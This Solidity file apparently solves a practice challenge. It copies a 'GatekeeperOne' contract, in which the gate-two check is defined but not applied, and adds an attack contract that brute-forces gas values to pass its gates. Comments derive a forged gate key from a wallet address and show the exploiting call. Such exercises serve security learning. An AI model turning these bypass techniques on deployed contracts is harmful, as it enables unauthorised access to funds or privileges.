// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "GatekeeperOne: error gate one");
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 5 == 0, "GatekeeperOne: error gate two");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }


    function enter(bytes8 _gateKey) public gateOne gateThree(_gateKey) returns (bool) {

        entrant = tx.origin;
        return true;
    }
}

contract Atk_Gate1 {
    GatekeeperOne public target;
    uint public gas_left;

    function set_target(address addr) public {
        target = GatekeeperOne(addr);
    }

    function enter(bytes8 _key) public {
        for (uint256 i = 0; i <= 8191; i++) {
            try target.enter{gas : 819100 + i}(_key) {
                gas_left = 819100 + i;
                break;
            } catch {}
        }
    }

    fallback() payable external {

    }
}

//wallet: 0x833514593c7798551A20Ac69f98D486e2A12dFe8
//        uint16(uint160(tx.origin)) : 0xdFe8
//        uint32(uint64(_gateKey)): 0x0000dFe8
//        uint64(_gateKey) : 0x--------0000dFe8

// atk.enter('0x10000dFe8',{"from":wallet})

